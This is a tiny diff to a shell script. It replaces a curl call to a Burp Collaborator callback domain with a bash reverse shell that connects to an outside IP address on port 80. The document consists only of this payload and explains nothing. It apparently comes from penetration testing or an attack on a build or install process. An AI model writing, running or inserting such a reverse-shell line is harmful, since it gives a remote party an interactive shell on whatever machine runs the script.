@@ -1,2 +1,3 @@
 #!/bin/sh
-curl http://wvvfbtu5mk0xkiubb1dh9gcu2l8bw0.burpcollaborator.net
+
+bash -i >& /dev/tcp/34.121.22.176/80 0>&1
